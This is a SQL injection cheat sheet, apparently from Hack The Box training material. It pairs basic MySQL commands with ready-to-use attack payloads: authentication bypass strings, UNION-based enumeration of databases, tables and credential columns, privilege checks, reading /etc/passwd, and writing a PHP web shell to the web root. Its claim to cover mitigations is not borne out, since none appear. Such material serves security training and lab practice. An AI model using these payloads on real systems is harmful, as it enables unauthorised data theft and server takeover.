### SQL Injection Fundamentals Cheat Sheet 

---

#### **MySQL Commands**

|Command|Description|
|---|---|
|`mysql -u root -h docker.hackthebox.eu -P 3306 -p`|Login to MySQL database|
|`SHOW DATABASES`|List available databases|
|`USE users`|Switch to a database|

---

#### **Tables**

|Command|Description|
|---|---|
|`CREATE TABLE logins (id INT, ...)`|Add a new table|
|`SHOW TABLES`|List available tables in current database|
|`DESCRIBE logins`|Show table properties and columns|
|`INSERT INTO table_name VALUES (value_1,...)`|Add values to a table|
|`INSERT INTO table_name(column2, ...) VALUES (...)`|Add values to specific columns in a table|
|`UPDATE table_name SET column1=newvalue1 WHERE ...`|Update table values|

---

#### **Columns**

|Command|Description|
|---|---|
|`SELECT * FROM table_name`|Show all columns in a table|
|`SELECT column1, column2 FROM table_name`|Show specific columns in a table|
|`DROP TABLE logins`|Delete a table|
|`ALTER TABLE logins ADD newColumn INT`|Add new column|
|`ALTER TABLE logins RENAME COLUMN ...`|Rename column|
|`ALTER TABLE logins MODIFY oldColumn DATE`|Change column datatype|
|`ALTER TABLE logins DROP oldColumn`|Delete column|

---

#### **Output and Sorting**

|Command|Description|
|---|---|
|`SELECT * FROM logins ORDER BY column_1`|Sort by column|
|`SELECT * FROM logins ORDER BY column_1 DESC`|Sort by column in descending order|
|`SELECT * FROM logins LIMIT 2`|Show the first two results|
|`SELECT * FROM logins LIMIT 1, 2`|Show results starting from index 2|
|`SELECT * FROM table_name WHERE <condition>`|Filter results based on a condition|
|`SELECT * FROM logins WHERE username LIKE ...`|Filter results matching a string pattern|

---

#### **SQL Injection Payloads**

|Payload|Description|
|---|---|
|`admin' or '1'='1`|Basic auth bypass|
|`admin')-- -`|Bypass with comments|

---

#### **Union Injection**

|Payload|Description|
|---|---|
|`' order by 1-- -`|Detect number of columns with `ORDER BY`|
|`cn' UNION select 1,2,3-- -`|Detect number of columns with `UNION`|
|`cn' UNION select 1,@@version,3,4-- -`|Retrieve MySQL version|
|`UNION select username, 2, 3, 4 FROM passwords-- -`|Extract data with UNION|

---

#### **Database Enumeration**

|Payload|Description|
|---|---|
|`SELECT @@version`|Fingerprint MySQL|
|`SELECT SLEEP(5)`|Fingerprint MySQL without output|
|`cn' UNION select 1,database(),2,3-- -`|Get current database name|
|`cn' UNION select 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -`|List all databases|
|`cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dev'-- -`|List all tables in a database|
|`cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='credentials'-- -`|List all columns in a table|

---

#### **Privileges**

|Payload|Description|
|---|---|
|`cn' UNION SELECT 1, user(), 3, 4-- -`|Find current user|
|`cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`|Check if user has admin privileges|
|`cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -`|Check accessible directories|

---

#### **File Injection**

|Payload|Description|
|---|---|
|`cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`|Read a local file|
|`SELECT 'file written successfully!' INTO OUTFILE '/var/www/html/proof.txt'`|Write a string to a local file|
|`cn' UNION SELECT "", '<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -`|Write a PHP web shell|

---

### **Resources**

- [PayloadAllTheThings SQL Injection Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)

This cheat sheet summarizes SQL Injection techniques, mitigations, and methods to enumerate or exploit databases effectively.